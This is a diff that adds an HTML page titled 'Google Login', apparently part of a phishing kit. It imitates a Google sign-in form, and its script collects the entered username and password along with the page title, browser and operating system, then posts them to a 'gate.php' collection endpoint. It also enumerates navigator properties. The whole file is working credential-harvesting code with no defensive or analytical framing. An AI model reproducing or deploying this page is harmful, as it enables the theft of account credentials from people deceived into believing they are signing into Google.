@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Login</title>
+
+    <link href="css/style.css" rel="stylesheet"> 
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+    <script>
+    
+    $(document).ready(function(){
+        $("button").click(function(){
+            var Username = document.getElementById("Username").value;
+            var Password = document.getElementById("Password").value;
+            var DocumentTitle = document.title;
+
+            var platform = navigator["platform"];
+            var Browser = navigator["appCodeName"]
+
+            // alert(Browser);
+
+            if (Browser == ""){
+                Browser = "N/A";
+            }
+
+            if (platform == ""){
+                platform = "N/A";
+            }
+
+            var x = '';
+            for(var p in navigator){
+            try {
+                x += p + '=' + navigator[p] + "\n";
+                console.log(x);
+            }
+            catch(e) {
+                console.error(e);
+            }
+            }
+            $.post("gate.php",
+            {
+            Username: Username,
+            Password: Password,
+            pageTitle: DocumentTitle,
+            Browser: Browser,
+            os: platform
+            },
+            function(data,status){
+            // alert("Data: " + data + "\nStatus: " + status);
+            });
+        });
+    });
+    </script>
+
+</head>
+<body>  
+    <form method="post">
+        <div class="box">
+            <h2>Sign in</h2>
+            <p>Use your Google Account</p>
+            <form>
+              <div class="inputBox">
+                <input type="text" name="email" id="Username" required="" value="">
+                <label>Username</label>
+              </div>
+              <div class="inputBox">
+                    <input type="text" name="text" id="Password" required="" value="">
+                    <label>Password</label>
+                  </div>
+              <button> Sign-IN</button>
+            </form>
+          </div>
+    </form>
+
+</body>
+</html>
